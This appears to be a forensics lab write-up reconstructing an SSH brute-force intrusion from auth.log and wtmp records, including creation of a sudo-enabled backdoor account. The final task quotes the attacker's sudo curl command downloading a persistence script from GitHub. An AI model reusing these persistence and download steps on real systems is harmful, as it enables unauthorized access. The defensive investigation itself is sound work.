# task 1: find the attacker's IP

I notice in the logs many failed requests coming from 65.2.161.68, so I deduce that this IP is attempting a brute-force attack on the service.

# task 2: find the compromised account

in lines 281 to 283:

```
Mar 6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar 6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar 6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
```

I observe a successful login from the same IP that was performing the brute-force, targeting the root account.

# task 3: login timestamp (wtmp)

to read the file, I use utmpdump:

```
utmpdump wtmp 
Utmp dump of wtmp
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:17,804944+00:00]
[5] [00601] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[6] [00601] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,072401+00:00]
[5] [00618] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[6] [00618] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-01-25T11:12:31,080342+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-01-25T11:12:33,792454+00:00]
[7] [01284] [ts/0] [ubuntu  ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:13:58,354674+00:00]
[8] [01284] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T11:15:12,956114+00:00]
[7] [01483] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-01-25T11:15:40,806926+00:00]
[8] [01404] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-01-25T12:34:34,949753+00:00]
[7] [836798] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:33:49,408334+00:00]
[5] [838568] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[6] [838568] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-02-11T10:39:02,172417+00:00]
[7] [838962] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:41:11,700107+00:00]
[8] [838896] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T10:41:46,272984+00:00]
[7] [842171] [ts/1] [root    ] [pts/1       ] [203.101.190.9       ] [203.101.190.9  ] [2024-02-11T10:54:27,775434+00:00]
[8] [842073] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769514+00:00]
[8] [836694] [    ] [        ] [pts/0       ] [                    ] [0.0.0.0        ] [2024-02-11T11:08:04,769963+00:00]
[1] [00000] [~~  ] [shutdown] [~           ] [6.2.0-1017-aws      ] [0.0.0.0        ] [2024-02-11T11:09:18,000731+00:00]
[2] [00000] [~~  ] [reboot  ] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:15,744575+00:00]
[5] [00464] [tyS0] [        ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[6] [00464] [tyS0] [LOGIN   ] [ttyS0       ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,354378+00:00]
[5] [00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```

And I found this one :

`[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]`

which shows a `[7]` type (login), PID `2549`, remote terminal `pts/1`, from our attacker’s IP `65.2.161.68` on `2024-03-06 at 06:32:45`.

# task 4: ssh session

The brute-force login shows:

`Mar 6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.`

**BUT** the attacker used a brute-force script that opened and closed the session immediately. I want the session opened manually with the discovered password:

```
Mar 6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar 6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar 6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

And I find session 37!

# task 5/6: privilege escalation

I notice a user account being added directly after the attacker's login:

```
Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar 6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar 6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar 6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar 6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar 6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

this gives them privilege escalation to have a persistent backup account in case the root password changes.

the account name is **cyberjunkie**
**MITRE ATT\&CK sub-technique ID**: T1136.001 – *Create Account: Local Account*

# task 7: root session end

The attacker disconnected here:

```
Mar 6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar 6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar 6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
```

the exact date is `2024-03-06 06:37:24`

# task 8: malicious download

I find the following line:

`Mar 6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

Which corresponds to the download of a malicious script!